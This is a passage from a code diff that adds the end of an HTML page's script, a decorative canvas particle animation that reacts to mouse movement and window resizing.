+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(mouse.x, mouse.y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+
+                for (const p of particles) {
+                    ctx.fillStyle = 'rgba(232, 237, 242, 0.5)';
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            function loop() {
+                if (!document.hidden) draw();
+                requestAnimationFrame(loop);
+            }
+
+            window.addEventListener('resize', resize);
+            window.addEventListener('mousemove', function (e) {
+                mouse.x = e.clientX;
+                mouse.y = e.clientY;
+            });
+            window.addEventListener('mouseleave', function () {
+                mouse.x = null;
+                mouse.y = null;
+            });
+
+            resize();
+            if (reduced) {
+                draw();
+            } else {
+                requestAnimationFrame(loop);
+            }
+        })();
+    </script>
+</body></html>
